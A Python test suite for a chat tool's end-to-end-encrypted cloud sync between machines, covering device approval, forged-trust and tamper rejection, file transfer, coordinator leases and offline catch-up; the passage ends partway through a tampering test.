"""Cloud sync between machines: several hubs in one process, sharing an in-memory Firestore.

Needs the `cryptography` library; skipped without it. Google's Firestore library is not needed.
"""
import argparse
import base64
import contextlib
import io
import json
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
from unittest import mock
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

TMP = tempfile.mkdtemp(prefix="crewchat-cloud-test-")
os.environ.setdefault("CREWCHAT_HOME", str(Path(TMP) / "unused"))

import crewchat  # noqa: E402
import crewchat_cloud as cloud  # noqa: E402

try:
    import cryptography  # noqa: F401
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

crewchat.Handler.log_message = lambda *args: None
crewchat.user_home = lambda: Path(TMP) / "user"  # never the real ~/.claude.json or ~/.cursor
os.environ.pop("CLAUDE_CONFIG_DIR", None)
cloud.STATE_DEBOUNCE = 0.2  # publish roster changes quickly in tests


def clean_code(text):
    """A pairing code as a phone reads it: upper case, and only the code's letters and digits."""
    return "".join(c for c in str(text or "").upper() if c in cloud.PAIR_ALPHABET)


def wait_until(check, timeout=10, message="condition"):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = check()
        if result:
            return result
        time.sleep(0.05)
    raise AssertionError("timed out waiting for " + message)


class Link:
    """One machine's connection to the shared store, which can be cut."""

    def __init__(self, store):
        self.store = store
        self.online = True

    def __getattr__(self, name):
        attr = getattr(self.store, name)
        if name in ("listen", "close") or not callable(attr):
            return attr

        def call(*args, **kwargs):
            if not self.online:
                raise cloud.CloudError("offline")
            return attr(*args, **kwargs)
        return call


class Machine:
    count = 0

    def __init__(self, store, name):
        Machine.count += 1
        self.root = Path(TMP) / ("m%d-%s" % (Machine.count, name))
        self.root.mkdir(parents=True)
        # Agents named after tool and machine (claude-mac): two machines that each pick the same first name
        # at once settle the clash with a rename, which these tests should not have to wait for.
        crewchat.save_config({"project": "Demo", "agent_names": "place"}, self.root)
        self.link = Link(store)
        self.device = cloud.Device(self.root)
        self.device.create(name)
        self.account = cloud.Account(self.link, self.device)
        self.result = self.account.register()
        self.projects = crewchat.Projects(self.root)
        self.hub = self.projects.primary.hub
        self.sync = cloud.CloudSync(self.hub, self.link, self.device, log=lambda text: None).start()

    def agent(self, client="claude"):
        sid = self.hub.open_session(self.device.name, client)
        return self.hub.agent_for(sid)

    def say(self, to, text, kind="msg"):
        return self.hub.send(crewchat.OWNER, to, text, kind)

    def has(self, text):
        with self.hub.lock:
            return any(m["text"] == text for m in self.hub.messages)

    def stop(self):
        self.sync.stop()


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class Crypto(unittest.TestCase):
    def test_sealing(self):
        key = os.urandom(32)
        nonce, ct = cloud.seal(key, "aad", {"text": "hello → world"})
        self.assertEqual(cloud.unseal(key, "aad", nonce, ct), {"text": "hello → world"})
        with self.assertRaises(Exception):
            cloud.unseal(key, "other aad", nonce, ct)
        tampered = cloud.b64(bytes([cloud.unb64(ct)[0] ^ 1]) + cloud.unb64(ct)[1:])
        with self.assertRaises(Exception):
            cloud.unseal(key, "aad", nonce, tampered)
        with self.assertRaises(Exception):
            cloud.unseal(os.urandom(32), "aad", nonce, ct)

    def test_wrapping_signing_and_fingerprints(self):
        private = cloud.new_private_key()
        pub = cloud.public_pem(private)
        key = os.urandom(32)
        self.assertEqual(cloud.unwrap(private, cloud.wrap(pub, key)), key)
        sig = cloud.sign(private, b"data")
        self.assertTrue(cloud.verify(pub, sig, b"data"))
        self.assertFalse(cloud.verify(pub, sig, b"other"))
        self.assertFalse(cloud.verify(cloud.public_pem(cloud.new_private_key()), sig, b"data"))
        self.assertRegex(cloud.fingerprint(pub), r"^[0-9a-f]{4}( [0-9a-f]{4}){3}$")


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class Devices(unittest.TestCase):
    def setUp(self):
        self.store = cloud.MemoryStore()
        self.a = Machine(self.store, "mac")
        self.b = Machine(self.store, "windows")

    def tearDown(self):
        for m in (self.a, self.b):
            m.stop()

    def test_the_first_device_founds_the_account_and_the_next_waits(self):
        self.assertEqual(self.a.result, "founded")
        self.assertTrue(self.a.device.ready)
        self.assertEqual(self.a.device.tag, "A")
        self.assertEqual(self.b.result, "pending")
        self.assertFalse(self.b.device.ready)
        self.assertEqual(self.b.device.tag, "B")

    def test_approval_needs_the_right_fingerprint(self):
        with self.assertRaises(cloud.CloudError):
            self.a.account.approve("windows", expect_fp="0000 0000 0000 0000")
        self.assertFalse(self.b.device.ready)
        self.a.account.approve("windows", expect_fp=self.b.device.fp)
        wait_until(lambda: self.b.device.ready, message="the new device to receive the key")
        self.assertEqual(set(self.b.device.trust["devices"]), {self.a.device.id, self.b.device.id})
        self.assertEqual(self.b.device.current, self.a.device.current)

    def test_a_waiting_device_cannot_approve_and_reads_nothing(self):
        with self.assertRaises(cloud.CloudError):
            self.b.account.approve("mac", expect_fp=self.a.device.fp)
        self.a.say("all", "secret before approval")
        time.sleep(1)
        self.assertFalse(self.b.has("secret before approval"))
        # Once approved, what it could not read before arrives.
        self.a.account.approve("windows", expect_fp=self.b.device.fp)
        wait_until(lambda: self.b.has("secret before approval"), message="held message after approval")

    def test_a_forged_trust_list_is_ignored(self):
        intruder = cloud.Device(Path(tempfile.mkdtemp(dir=TMP)))
        intruder.create("intruder")
        entry = {"fp": intruder.fp, "name": "intruder", "tag": "Z", "pub": intruder.pub}
        forged = cloud.sign_trust(intruder, {intruder.id: entry, self.a.device.id: self.a.device.trust["devices"][self.a.device.id]}, 99)
        before = dict(self.a.device.trust)
        self.store.set("meta/trust", forged)
        time.sleep(0.5)
        self.assertEqual(self.a.device.trust["version"], before["version"])
        self.assertNotIn(intruder.id, self.a.device.trust["devices"])

    def test_identity_survives_a_restart(self):
        again = cloud.Device(self.a.root)
        self.assertEqual((again.id, again.tag, again.fp, again.current), (
            self.a.device.id, self.a.device.tag, self.a.device.fp, self.a.device.current))
        self.assertTrue(again.ready)

    def test_retired_keys_survive_a_restart_and_an_older_crewchats_count_as_retired(self):
        old = self.a.device.current
        self.a.account.rotate()
        self.assertIn(old, cloud.Device(self.a.root).retired)
        keys = json.loads((self.a.root / "cloud" / "keys.json").read_text())
        del keys["retired"]  # as a crewchat before retired keys wrote it
        (self.a.root / "cloud" / "keys.json").write_text(json.dumps(keys))
        again = cloud.Device(self.a.root)
        self.assertEqual(set(again.retired), {old})
        self.assertNotIn(again.current, again.retired)


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class Sync(unittest.TestCase):
    def setUp(self):
        self.store = cloud.MemoryStore()
        self.a = Machine(self.store, "mac")
        self.b = Machine(self.store, "windows")
        self.a.account.approve("windows", expect_fp=self.b.device.fp)
        wait_until(lambda: self.b.device.ready, message="approval")

    def tearDown(self):
        for m in (self.a, self.b):
            m.stop()

    def test_a_machine_waiting_for_approval_shows_with_its_fingerprint(self):
        c = Machine(self.store, "laptop")
        try:
            row = wait_until(lambda: next((r for r in self.a.sync.machines_status() if r["name"] == "laptop"), None),
                             message="the mac to see the new machine")
            self.assertEqual((row["state"], row["fp"]), ("waiting", c.device.fp))
            self.a.account.approve("laptop", expect_fp=c.device.fp)
            wait_until(lambda: next(r for r in self.a.sync.machines_status() if r["name"] == "laptop")["state"] != "waiting",
                       message="approved: no longer waiting")
        finally:
            c.stop()

    def test_cloud_setup_and_approve_from_the_page(self):
        # M1: the Machines panel's cloud steps, with the commands' own code.
        root = Path(tempfile.mkdtemp(prefix="cloud-setup-", dir=TMP))
        crewchat.save_config({"project": "Demo"}, root)
        out = cloud.page_op(self.a.hub, root, "cloud-setup", {
            "web": {"projectId": "my-proj", "apiKey": "AIza-key"},
            "oauth": {"installed": {"client_id": "123.apps", "client_secret": "THE-SECRET"}}}, True)
        self.assertEqual(out, {"project": "my-proj"})  # never the secret back to the page
        saved = root / "cloud" / "firebase.json"
        self.assertEqual(json.loads(saved.read_text())["oauth"]["client_secret"], "THE-SECRET")
        if os.name != "nt":
            self.assertEqual(saved.stat().st_mode & 0o777, 0o600)
        c = Machine(self.store, "laptop")
        try:
            with self.assertRaises(cloud.CloudError):
                cloud.page_op(self.a.hub, self.a.root, "cloud-approve", {"name": "laptop", "fingerprint": "wrong"}, True)
            self.assertFalse(c.device.ready)
            cloud.page_op(self.a.hub, self.a.root, "cloud-approve", {"name": "laptop", "fingerprint": c.device.fp}, True)
            wait_until(lambda: c.device.ready, message="the laptop's approval")
            with self.assertRaises(cloud.CloudError):  # Google's sign-in only at the machine itself
                cloud.page_op(self.a.hub, self.a.root, "cloud-login", {}, False)
        finally:
            c.stop()

    def test_check_everything_over_cloud_sync(self):
        checks = {c["id"]: c for c in crewchat.link_checks(self.a.projects, deep=True)}
        self.assertIs(checks["cloud-approved"]["ok"], True)
        self.assertIs(checks["cloud-reachable"]["ok"], True)
        self.assertNotIn("tailscale-installed", checks)  # Tailscale's checks are for its own way only
        self.a.link.online = False
        try:
            self.assertIs({c["id"]: c for c in crewchat.link_checks(self.a.projects, deep=True)}["cloud-reachable"]["ok"], False)
        finally:
            self.a.link.online = True

    def test_sign_in_from_the_page_fails_at_once_when_no_browser_opens(self):
        # Review: with no browser to open (a service with no display), the page waited five minutes for nothing.
        root = Path(tempfile.mkdtemp(prefix="no-browser-", dir=TMP))
        crewchat.save_config({"project": "Demo"}, root)
        cloud.page_op(self.a.hub, root, "cloud-setup", {"web": {"projectId": "p", "apiKey": "k"},
                                                         "oauth": {"client_id": "c", "client_secret": "s"}}, True)
        with mock.patch.object(cloud.webbrowser, "open", return_value=False), mock.patch.object(cloud.time, "sleep"):
            started = time.time()
            with self.assertRaises(cloud.CloudError) as e:
                cloud.page_op(self.a.hub, root, "cloud-login", {}, True)
        self.assertLess(time.time() - started, 5)
        self.assertIn("crewchat cloud login", str(e.exception))

    def test_the_sign_in_server_does_not_look_its_own_name_up(self):
        # GitHub's macOS runner, 31 Oct and 3 Nov: HTTPServer looks up the name of 127.0.0.1 when it starts, and the
        # first such lookup there waits 30 s. A Mac whose reverse DNS is slow would wait as long for every sign-in.
        root = Path(tempfile.mkdtemp(prefix="no-lookup-", dir=TMP))
        crewchat.save_config({"project": "Demo"}, root)
        cloud.page_op(self.a.hub, root, "cloud-setup", {"web": {"projectId": "p", "apiKey": "k"},
                                                         "oauth": {"client_id": "c", "client_secret": "s"}}, True)
        with mock.patch.object(cloud.webbrowser, "open", return_value=False), \
                mock.patch("socket.getfqdn", side_effect=AssertionError("looked its own name up")):
            with self.assertRaises(cloud.CloudError):
                cloud.page_op(self.a.hub, root, "cloud-login", {}, True)

    def test_shared_files_open_on_the_other_machine(self):
        # Roadmap Y4: a file up to 5 MB travels with its message, encrypted, in pieces under Firestore's limit.
        data = os.urandom(cloud.CLOUD_FILE_MAX)  # a 5 MB screenshot: ten pieces
        meta = self.a.hub.add_file("screenshot.png", data, "image/png")
        msg = self.a.hub.send(crewchat.OWNER, "all", "see the screenshot", files=[meta])
        wait_until(lambda: self.b.has("see the screenshot"), message="the message")
        parts = -(-len(data) // cloud.FILE_PART)
        wait_until(lambda: self.store.get("files/%s-%d" % (meta["id"], parts - 1)), message="the file's last piece")
        got, path = self.b.hub.open_file(meta["id"])
        self.assertEqual((got["name"], path.read_bytes()), ("screenshot.png", data))
        # Firestore holds ciphertext only: neither the bytes, nor the name, nor the message.
        stored = json.dumps(self.store.docs, default=str)
        self.assertNotIn("screenshot", stored)
        self.assertNotIn(base64.b64encode(data[:300]).decode()[:200], stored)
        self.assertEqual(self.store.get("files/%s-0" % meta["id"])["parts"], parts)
        # Each piece within what the security rules let through (MemoryStore refuses more, as Firestore does).
        self.assertTrue(all(len(d["ct"]) <= 60000 for k, d in self.store.docs.items() if k.startswith("files/")))
        # A file too big to travel stays on its machine, and says so.
        big = self.a.hub.add_file("video.mov", os.urandom(cloud.CLOUD_FILE_MAX + 1), "video/quicktime")
        self.a.hub.send(crewchat.OWNER, "all", "the video", files=[big])
        wait_until(lambda: self.b.has("the video"), message="the second message")
        with self.assertRaises(crewchat.HubError) as e:
            self.b.hub.open_file(big["id"])
        self.assertIn("on mac only", str(e.exception))
        self.assertIn("paid (Blaze) plan, raise cloud_file_mb", str(e.exception))  # why, and what the owner can do
        self.assertIsNone(self.store.get("files/%s-0" % big["id"]))
        # A piece changed in the cloud does not open.
        small = self.a.hub.add_file("notes.txt", b"tamper with me", "text/plain")
        self.a.hub.send(crewchat.OWNER, "all", "the notes", files=[small])
        # Both: the other machine must know the file (from its message) before it can try the cloud.
        wait_until(lambda: self.b.has("the notes") and self.store.get("files/%s-0" % small["id"]),
                   message="the notes in the cloud")
        doc = dict(self.store.get("files/%s-0" % small["id"]))
        doc["ct"] = doc["ct"][:-4] + ("AAAA" if not doc["ct"].endswith("AAAA") else "BBBB")
        self.store.set("files/%s-0" % small["id"], doc)
        with self.assertRaises(crewchat.HubError) as e:
            self.b.hub.open_file(small["id"])
        self.assertIn("cannot fetch that file from the cloud", str(e.exception))
        # Delivered everywhere: the messages go, but a file stays for the retention, as nobody may have opened it
        # yet (it is fetched when someone does).
        later = self.a.hub.add_file("later.log", b"opened an hour on", "text/plain")
        self.a.hub.send(crewchat.OWNER, "all", "the log", files=[later])
        wait_until(lambda: self.b.has("the log") and self.store.get("files/%s-0" % later["id"]), message="the log")
        for m in (self.a, self.b):
            m.sync.marks["synced_to"] = time.time() + 60
            m.sync.housekeeping()
        self.a.sync.housekeeping()
        self.assertFalse([k for k in self.store.docs if k.startswith("messages/")])
        self.assertEqual(self.b.hub.open_file(later["id"])[1].read_bytes(), b"opened an hour on")
        ttl, self.a.sync.ttl = self.a.sync.ttl, 0.001  # past the retention, they go
        try:
            time.sleep(0.01)
            self.a.sync.housekeeping()
        finally:
            self.a.sync.ttl = ttl
        self.assertFalse([k for k in self.store.docs if k.startswith("files/")])
        self.assertTrue(msg)

    def test_the_advisors_mark_travels(self):
        # A2: the asking agent's conversation goes with its question for the advisor only, on every machine.
        config = Path(tempfile.mkdtemp(prefix="claude-config-", dir=TMP))
        path = config / "projects" / "x" / "s.jsonl"
        path.parent.mkdir(parents=True)
        path.write_text(json.dumps({"type": "assistant", "message": {"role": "assistant", "content": [
            {"type": "tool_use", "name": "Bash", "input": {"command": "npm test"}}]}}) + "\n")
        asker, advisor, other = self.a.agent(), self.b.agent(), self.b.agent()
        for m in (self.a, self.b):  # each tells the other what it is (machine_info, with the marks it keeps)
            m.sync.info_source = (lambda m=m: crewchat.machine_info(m.projects))
        self.b.hub.set_role(crewchat.OWNER, advisor, "advisor")
        wait_until(lambda: advisor in self.a.hub._advisors(), message="the mac to know the advisor")
        wait_until(lambda: "for" in (self.a.sync.info_of(self.b.device.id).get("marks") or []),
                   message="the mac to hear the other keeps the mark")
        with self.a.hub.lock:
            self.a.hub.agents[asker]["conversation"] = {"tool": "claude", "place": path.resolve()}
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": str(config)}):
            question, _ = self.a.hub.ask(asker, "Is npm test enough here?", to=advisor, wait=0)
        fid = question["files"][0]["id"]
        wait_until(lambda: self.b.has(question["text"]) and self.store.get("files/%s-0" % fid),
                   message="the question and its file in the cloud")
        with self.b.hub.lock:
            got = next(m for m in self.b.hub.messages if m["id"] == question["id"])
        self.assertEqual(got["files"][0]["for"], advisor)
        self.assertIsNone(self.b.hub.file(fid)[0])  # not on the windows machine yet: from the cloud's pieces
        with self.assertRaises(crewchat.HubError) as e:
            crewchat.open_shared_file(self.b.hub, fid, other)
        self.assertEqual(str(e.exception), "that file is for the advisor")
        self.assertIn("tool Bash: npm test", crewchat.open_shared_file(self.b.hub, fid, advisor))
        self.assertNotIn("conversation-", crewchat.fmt(got, other))

    def test_with_an_older_machine_the_question_goes_without_it(self):
        # Review of A2: a crewchat before it drops the mark, lists the file for every agent and relays its copy.
        config = Path(tempfile.mkdtemp(prefix="claude-config-", dir=TMP))
        path = config / "projects" / "x" / "s.jsonl"
        path.parent.mkdir(parents=True)
        path.write_text(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "hi"}]}}) + "\n")
        asker, advisor = self.a.agent(), self.b.agent()
        self.a.sync.info_source = lambda: crewchat.machine_info(self.a.projects)
        # Windows sends null info (not known yet): that is not older. An older crewchat said nothing, which is
        # an empty mark record (keep_info None), and the excerpt stays off for that.
        self.a.sync.keep_info(self.b.device.id, None)
        self.b.hub.set_role(crewchat.OWNER, advisor, "advisor")
        wait_until(lambda: advisor in self.a.hub._advisors(), message="the mac to know the advisor")
        self.assertEqual(self.a.sync.older_machines(), [self.b.device.id])
        with self.a.hub.lock:
            self.a.hub.agents[asker]["conversation"] = {"tool": "claude", "place": path.resolve()}
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": str(config)}):
            question, _ = self.a.hub.ask(asker, "Older machine about?", to=advisor, wait=0)
        self.assertNotIn("files", question)
        self.assertIn("not available: a linked machine runs an older crewchat, which would show it to every agent.",
                      question["text"])

    def test_on_a_paid_plan_the_owner_can_let_bigger_files_travel(self):
        for m in (self.a, self.b):
            m.sync.file_max = 7 * 1024 * 1024  # cloud_file_mb = 7
        data = os.urandom(6 * 1024 * 1024)
        meta = self.a.hub.add_file("recording.mov", data, "video/quicktime")
        self.a.hub.send(crewchat.OWNER, "all", "the recording", files=[meta])
        wait_until(lambda: self.b.has("the recording"), message="the message")
        wait_until(lambda: self.store.get("files/%s-%d" % (meta["id"], -(-len(data) // cloud.FILE_PART) - 1)),
                   message="the last piece")
        self.assertEqual(self.b.hub.open_file(meta["id"])[1].read_bytes(), data)
        self.assertEqual(cloud.CloudSync(self.a.hub, self.a.link, self.a.device, file_max=10 ** 9).file_max,
                         crewchat.MAX_UPLOAD)  # never past crewchat's own limit for a shared file

    def test_the_preferred_machine_takes_the_lease_at_once(self):
        # Review: renewing skipped its write on the cached lease (another's, live), so choosing this machine as the
        # preferred coordinator waited for a later renewal instead of taking over at once.
        now = [time.time()]
        for m in (self.a, self.b):
            m.sync.clock = lambda: now[0]
        self.b.sync.renew_lease()
        self.a.sync.lease = {"device": self.b.device.id, "expires": now[0] + cloud.LEASE_SECS, "term": 1}  # as heard
        self.assertEqual(self.a.sync.set_preferred("mac")["name"], "mac")
        self.assertTrue(self.a.sync.coordinator()["me"])

    def test_the_lease_costs_few_writes_and_no_reads_while_another_holds_it(self):
        # On the free plan's 20,000 writes and 50,000 reads a day: renewing every 30 s was 2,880 writes a day by
        # the holder, and as many reads by every other machine.
        self.assertLessEqual(86400 / cloud.LEASE_RENEW, 1000)
        self.assertGreaterEqual(cloud.LEASE_SECS, 2.5 * cloud.LEASE_RENEW)  # a late renewal or two still holds
        now = [time.time()]
        for m in (self.a, self.b):
            m.sync.clock = lambda: now[0]
        self.a.sync.renew_lease()
        self.b.sync.renew_lease()
        self.assertEqual(self.b.sync.coordinator()["name"], "mac")
        with mock.patch.object(self.b.link, "transact", wraps=self.b.link.transact) as write, \
                mock.patch.object(self.b.link, "get", wraps=self.b.link.get) as read:
            for _ in range(3):
                now[0] += cloud.LEASE_RENEW
                self.a.sync.renew_lease()  # its listener hears each renewal, with the lease's new end
                wait_until(lambda: float(self.b.sync.lease.get("expires") or 0) == now[0] + cloud.LEASE_SECS,
                           message="the renewal to be heard")
                self.b.sync.renew_lease()
            self.assertEqual((write.call_count, read.call_count), (0, 0))
            self.a.link.online = False  # the holder is gone: once its lease has run out, the other takes it
            now[0] += cloud.LEASE_SECS + 1
            self.b.sync.renew_lease()
            self.assertEqual(write.call_count, 1)
        self.a.link.online = True
        self.assertTrue(self.b.sync.coordinator()["me"])

    def test_the_page_names_the_coordinator_without_asking_the_cloud(self):
        # The page asks at every poll: the names come from the machines the account approved, kept on each
        # machine, and a renewal reads the lease once, in its conditional write.
        self.a.sync.renew_lease()
        self.b.sync.renew_lease()
        self.a.link.online = self.b.link.online = False
        self.assertEqual((self.b.sync.coordinator()["name"], self.a.sync.coordinator()["me"]), ("mac", True))
        self.a.link.online = self.b.link.online = True
        with mock.patch.object(self.a.link, "get", wraps=self.a.link.get) as get:
            self.a.sync.renew_lease()
        self.assertEqual(get.call_count, 0)
        self.assertTrue(self.a.sync.coordinator()["me"])

    def test_whichever_machine_is_on_holds_the_coordinators_lease(self):
        # Roadmap Y1: a lease in meta/coordinator, renewed by its holder, taken over once it runs out.
        now = [time.time()]
        for m in (self.a, self.b):
            m.sync.clock = lambda: now[0]
        self.a.sync.renew_lease()
        self.assertTrue(self.a.sync.coordinator()["me"])
        term = self.a.sync.coordinator()["term"]
        self.b.sync.renew_lease()  # a live lease is left alone
        self.assertEqual((self.b.sync.coordinator()["name"], self.b.sync.coordinator()["me"]), ("mac", False))
        # The mac goes offline: its lease runs out, and the other machine takes it at its next renewal.
        self.a.link.online = False
        self.a.sync.renew_lease()  # cannot reach the cloud: nothing changes there
        now[0] += cloud.LEASE_SECS + 1
        self.b.sync.renew_lease()
        self.assertEqual(self.b.sync.coordinator(), {"name": "windows", "me": True, "term": term + 1, "preferred": ""})
        self.a.link.online = True
        self.a.sync.renew_lease()
        self.assertFalse(self.a.sync.coordinator()["me"])  # back, but the lease is someone else's now
        # The owner prefers the mac: it takes the role back at its next renewal, and the other lets go.
        self.assertEqual(self.b.sync.set_preferred("mac")["preferred"], "mac")
        wait_until(lambda: self.a.sync.lease.get("preferred") == self.a.device.id, message="the mac to hear it")
        self.a.sync.renew_lease()
        self.assertEqual(self.a.sync.coordinator()["term"], term + 2)
        self.assertTrue(self.a.sync.coordinator()["me"])
        self.b.sync.renew_lease()
        self.assertFalse(self.b.sync.coordinator()["me"])
        # Stopping hands it on at once rather than after LEASE_SECS.
        self.a.sync.release_lease()
        wait_until(lambda: float(self.b.sync.lease.get("expires") or 0) <= now[0], message="the other to hear it")
        self.b.sync.renew_lease()
        self.assertTrue(self.b.sync.coordinator()["me"])
        self.b.sync.set_preferred("none")
        self.assertEqual(self.b.sync.coordinator()["preferred"], "")
        with self.assertRaises(cloud.CloudError):
            self.b.sync.set_preferred("nowhere")

    def test_messages_reach_the_other_machine_with_global_ids(self):
        msg = self.a.say("all", "hello from the mac")
        self.assertEqual(msg["id"], "A%d" % msg["seq"])
        got = wait_until(lambda: next((m for m in self.b.hub.messages if m["text"] == "hello from the mac"), None))
        self.assertEqual(got["id"], msg["id"])
        self.assertEqual(got["from"], crewchat.OWNER)
        self.assertEqual(got["origin"], self.a.device.id)
        # Nothing comes back twice.
        time.sleep(0.5)
        self.assertEqual(sum(m["id"] == msg["id"] for m in self.a.hub.messages), 1)
        self.assertEqual(sum(m["id"] == msg["id"] for m in self.b.hub.messages), 1)

    def test_agents_on_two_machines_see_and_message_each_other(self):
        mac_agent = self.a.agent()
        win_agent = self.b.agent("cursor")
        wait_until(lambda: win_agent in self.a.hub.names and mac_agent in self.b.hub.names, message="rosters")
        row = next(r for r in self.a.hub.rows() if r["agent"] == win_agent)
        self.assertEqual((row["remote"], row["device"], row["client"], row["online"]), (True, "windows", "cursor", True))
        self.assertIn("(on another machine: windows)", crewchat.roster_text(self.a.hub.rows()))
        self.a.hub.send(mac_agent, win_agent, "can you check this on Windows?")
        unread = wait_until(lambda: self.b.hub.inbox(win_agent, 0, True), message="message to the remote agent")
        self.assertEqual(unread[0]["from"], mac_agent)
        self.assertEqual(self.a.hub.inbox(mac_agent, 0, True), [])
        # Names stay unique across machines.
        self.assertNotEqual(mac_agent, win_agent)
        with self.assertRaises(crewchat.HubError):
            self.a.hub.rename(mac_agent, win_agent)
        with self.assertRaises(crewchat.HubError):
            self.a.hub.remove(win_agent)

    def test_roles_and_progress_cross_machines(self):
        lead, dev = self.a.agent(), self.b.agent()
        wait_until(lambda: dev in self.a.hub.names and lead in self.b.hub.names, message="rosters")
        self.a.hub.set_role(crewchat.OWNER, lead, "lead")
        self.a.hub.set_role(crewchat.OWNER, dev, "developer")  # an agent on the other machine
        wait_until(lambda: self.b.hub.agents[dev]["role"] == "developer", message="the role to arrive")
        wait_until(lambda: any(r["agent"] == dev and r["role"] == "developer" for r in self.a.hub.rows()),
                   message="the role to show on the first machine")
        wait_until(lambda: any(r["agent"] == lead and r["role"] == "lead" for r in self.b.hub.rows()),
                   message="the lead to show on the second machine")
        piece = self.a.hub.assign(lead, dev, "Build it")
        wait_until(lambda: self.b.hub.taken.get(piece["id"]) == dev, message="the assignment")
        _, to = self.b.hub.update(dev, piece["id"], "done", "Built")
        self.assertEqual(to, lead)
        wait_until(lambda: self.a.hub.progress.get(piece["id"], {}).get("status") == "done", message="the update")
        self.assertIn("Built", [m["text"] for m in self.a.hub.inbox(lead, 0, True)])

    def test_read_receipts_cross_machines(self):
        win_agent = self.b.agent()
        msg = self.a.say(win_agent if wait_until(lambda: win_agent in self.a.hub.names) else "all", "read me")
        wait_until(lambda: self.b.has("read me"))
        self.b.hub.inbox(win_agent, 0, False)
        wait_until(lambda: next(r for r in self.a.hub.rows() if r["agent"] == win_agent)["cursor"] >= msg["seq"],
                   message="the read position to come back")

    def test_exactly_one_agent_takes_a_task_across_machines(self):
        mac_agents = [self.a.agent() for _ in range(2)]
        win_agents = [self.b.agent() for _ in range(2)]
        task = self.a.say("all", "fix the build", "task")
        wait_until(lambda: self.b.has("fix the build"))
        results = {}

        def take(machine, name):
            try:
                machine.hub.take(name, task["id"])
                results[name] = "won"
            except crewchat.HubError as e:
                results[name] = str(e)

        threads = [threading.Thread(target=take, args=(m, n)) for m, names in ((self.a, mac_agents), (self.b, win_agents))
                   for n in names]
        [t.start() for t in threads]
        [t.join() for t in threads]
        winners = [n for n, r in results.items() if r == "won"]
        self.assertEqual(len(winners), 1, results)
        for name, result in results.items():
            if name != winners[0]:
                self.assertIn("already taken by " + winners[0], result)
        wait_until(lambda: self.a.hub.taken.get(task["id"]) == winners[0] == self.b.hub.taken.get(task["id"]),
                   message="both machines to agree")

    def test_a_machine_offline_catches_up(self):
        self.a.link.online = False
        self.a.say("all", "written offline")
        time.sleep(1)
        self.assertFalse(self.b.has("written offline"))
        with self.assertRaises(crewchat.HubError):
            agent = self.a.agent()
            task = self.a.say("all", "task while offline", "task")
            self.a.hub.take(agent, task["id"])
        self.a.link.online = True
        wait_until(lambda: self.b.has("written offline"), timeout=20, message="the offline message")

    def test_a_machine_off_for_three_days_gets_every_message_through_the_coordinator(self):
        # Roadmap Y3, done when: a machine off for three days, longer than the cloud keeps messages, gets every
        # message once it is back, in order, as long as some machine was on meanwhile.
        self.b.stop()  # windows is off
        texts = ["while windows was off %d: %s" % (i, "x" * 3000) for i in range(30)]  # a few parts' worth
        for text in texts:
            self.a.say("all", text)
        wait_until(lambda: len(self.store.list("messages")) >= 30, message="the messages to be in the cloud")
        for doc_id, _ in self.store.list("messages"):  # three days on: the cloud has dropped them
            self.store.delete("messages/" + doc_id)
        self.a.sync.renew_lease()
        self.assertTrue(self.a.sync.coordinator()["me"])
        self.b.sync.marks["synced_to"] = time.time() - 3 * 86400  # windows last heard from the cloud then
        self.b.sync._save_marks()
        with mock.patch.object(cloud, "CATCHUP_PARTS", 1):  # paged: one part at a time, the next once it is read
            self.b.sync = cloud.CloudSync(self.b.hub, self.b.link, self.b.device, log=lambda text: None).start()
            wait_until(lambda: all(self.b.has(t) for t in texts), timeout=30, message="windows to catch up")
        with self.b.hub.lock:
            got = [m["text"] for m in self.b.hub.messages if m["text"].startswith("while windows was off")]
        self.assertEqual(got, texts)  # every one, once, in order
        self.assertEqual({m["origin"] for m in self.b.hub.messages if m["text"] in texts}, {self.a.device.id})
        wait_until(lambda: not self.store.list("catchup_parts") and not self.store.list("catchups"),
                   message="the parts to be deleted once read")
        self.assertGreater(float(self.b.sync.marks["synced_to"]), time.time() - 3600)  # it will not ask again

    def test_a_catch_up_through_the_cloud_goes_back_a_week(self):
        # The owner's choice: over cloud sync a machine catches up on the last CATCHUP_DAYS (Firestore's free quota);
        # older messages stay on the machines that have them.
        self.b.stop()
        with mock.patch("time.time", return_value=time.time() - 9 * 86400):
            self.a.say("all", "nine days ago")
        self.a.say("all", "this morning")
        wait_until(lambda: len(self.store.list("messages")) >= 2, message="the messages to be in the cloud")
        for doc_id, _ in self.store.list("messages"):
            self.store.delete("messages/" + doc_id)
        self.a.sync.renew_lease()
        self.b.sync.marks["synced_to"] = time.time() - 10 * 86400  # off for ten days
        self.b.sync._save_marks()
        self.b.sync = cloud.CloudSync(self.b.hub, self.b.link, self.b.device, log=lambda text: None).start()
        wait_until(lambda: self.b.has("this morning"), timeout=30, message="the recent message")
        wait_until(lambda: not self.store.list("catchups"), message="the catch-up to be done")
        self.assertFalse(self.b.has("nine days ago"))
        self.assertTrue(self.a.has("nine days ago"))  # still on the machine that wrote it

    def test_a_catch_up_keeps_the_order_when_times_are_equal(self):
        # A coarse clock (Windows) gives many messages one time: they come in their writer's order, A9 before A10.
        with mock.patch("time.time", return_value=1792000000.0):
            sent = [self.a.say("all", "same instant %d" % i) for i in range(12)]
        got = [m["id"] for m in self.a.hub.messages_since(1792000000.0 - 1) if m["text"].startswith("same instant")]
        self.assertEqual(got, [m["id"] for m in sent])

    def test_a_machine_away_for_less_than_the_ttl_does_not_ask(self):
        self.b.stop()
        self.b.sync.marks["synced_to"] = time.time() - 3600
        self.b.sync = cloud.CloudSync(self.b.hub, self.b.link, self.b.device, log=lambda text: None).start()
        self.assertEqual(self.store.list("catchups"), [])
        self.assertEqual(self.a.sync.serve_catch_ups(), 0)

    def test_tampered_messages_are_dropped(self):
        original = self.store.set

        def tamper(path, data, merge=False):
            if path.startswith("messages/") and isinstance(data.get("ct"), str) and data.get("dev") == self.a.device.id:
                raw = cloud.unb64(data["ct"])
                data = dict(data, ct=cloud.b64(bytes([raw[0] ^ 1]) + raw[1:]))
            return original(path, data, merge)

        self.store.set = tamper
